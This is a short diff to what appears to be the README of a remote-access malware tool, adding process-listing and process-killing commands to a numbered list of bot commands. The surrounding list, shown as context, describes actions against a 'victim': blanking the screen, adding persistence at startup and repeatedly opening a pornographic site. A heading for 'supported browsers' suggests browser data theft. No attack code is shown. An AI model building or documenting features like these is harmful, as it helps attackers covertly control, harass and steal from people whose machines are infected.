@@ -48,6 +48,8 @@ DOWNLOAD THE FILE AS A WHOLE ( AS A ZIP ). OPEN "getrequirements.bat", wait for 
 27. !screenoff -- Turns off the victims screen for 30 seconds
 28. !startup -- ACTUALLY ADDS TO STARTUP.
 29. !goon -- Opens The Hub a lot of times
+30. !processes -- Lists all processes
+31. !kill ( pid ) -- Kills processes
 
 # SUPPORTED BROWSERS 
 
